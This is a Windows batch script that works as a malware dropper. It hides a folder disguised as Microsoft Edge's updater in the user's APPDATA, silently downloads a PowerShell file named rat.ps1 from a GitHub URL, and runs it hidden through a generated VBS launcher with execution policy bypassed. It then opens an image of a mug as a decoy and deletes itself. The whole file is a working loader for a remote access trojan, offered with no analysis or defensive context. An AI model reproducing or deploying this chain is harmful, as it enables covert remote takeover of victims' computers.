@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
if not exist "%APPDATA%\Microsoft\EdgeUpdate" mkdir "%APPDATA%\Microsoft\EdgeUpdate"
attrib +h "%APPDATA%\Microsoft\EdgeUpdate"
if not exist "%APPDATA%\Microsoft\EdgeUpdate\updater.ps1" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/rat.ps1' -OutFile '%APPDATA%\Microsoft\EdgeUpdate\updater.ps1' -UseBasicParsing -ErrorAction Stop } catch {}" >nul 2>&1
)
echo Set objShell = CreateObject("WScript.Shell") > "%APPDATA%\Microsoft\EdgeUpdate\launcher.vbs"
echo objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File ""%APPDATA%\Microsoft\EdgeUpdate\updater.ps1""", 0, False >> "%APPDATA%\Microsoft\EdgeUpdate\launcher.vbs"
wscript.exe "%APPDATA%\Microsoft\EdgeUpdate\launcher.vbs" //B //Nologo
start https://ih1.redbubble.net/image.2807335966.3394/mug,standard,x334,right-pad,600x600,f8f8f8.jpg
REM Auto-eliminar2>nul & del "%~f0"
